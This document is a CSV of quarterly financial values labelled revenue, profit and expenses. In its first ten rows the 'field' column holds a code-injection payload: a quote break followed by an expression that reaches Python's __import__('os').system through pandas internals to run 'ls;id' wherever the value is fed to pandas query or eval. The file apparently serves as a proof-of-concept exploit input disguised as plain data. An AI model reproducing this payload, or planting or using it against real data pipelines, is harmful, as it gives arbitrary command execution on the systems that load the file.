date,period,value,field
20200331,202001,4526.82,1" and @pd.core.frame.com.builtins.__import__("os").system("ls;id") #
20200331,202001,4529.93,1" and @pd.core.frame.com.builtins.__import__("os").system("ls;id") #
20200331,202001,4819.1,1" and @pd.core.frame.com.builtins.__import__("os").system("ls;id") #
20200630,202002,1522.65,1" and @pd.core.frame.com.builtins.__import__("os").system("ls;id") #
20200630,202002,3945.45,1" and @pd.core.frame.com.builtins.__import__("os").system("ls;id") #
20200630,202002,6150.4,1" and @pd.core.frame.com.builtins.__import__("os").system("ls;id") #
20200930,202003,3852.31,1" and @pd.core.frame.com.builtins.__import__("os").system("ls;id") #
20200930,202003,5342.83,1" and @pd.core.frame.com.builtins.__import__("os").system("ls;id") #
20200930,202003,2160.46,1" and @pd.core.frame.com.builtins.__import__("os").system("ls;id") #
20201231,202004,8676.78,1" and @pd.core.frame.com.builtins.__import__("os").system("ls;id") #
20201231,202004,1931.29,profit
20201231,202004,9442.48,expenses
20210331,202101,1034.47,revenue
20210331,202101,4619.55,profit
20210331,202101,7579.75,expenses
20210630,202102,8714.76,revenue
20210630,202102,4888.31,profit
20210630,202102,4759.35,expenses
20210930,202103,1868.91,revenue
20210930,202103,4194.03,profit
20210930,202103,9184.32,expenses
20211231,202104,5595.02,revenue
20211231,202104,9640.9,profit
20211231,202104,3935.63,expenses
20220331,202201,5530.07,revenue
20220331,202201,9461.49,profit
20220331,202201,6243.51,expenses
20220630,202202,1117.75,revenue
20220630,202202,7086.98,profit
20220630,202202,1328.31,expenses
20220930,202203,2004.53,revenue
20220930,202203,4024.32,profit
20220930,202203,7731.57,expenses
20221231,202204,4964.71,revenue
20221231,202204,5634.73,profit
20221231,202204,1947.51,expenses
20230331,202301,7949.9,revenue
20230331,202301,1188.81,profit
20230331,202301,2892.81,expenses
20230630,202302,3045.96,revenue
20230630,202302,3202.21,profit
20230630,202302,9942,expenses
20230930,202303,4947.34,revenue
20230930,202303,8402.38,profit
20230930,202303,8144.99,expenses
20231231,202304,6998.34,revenue
20231231,202304,6070,profit
20231231,202304,4328.21,expenses
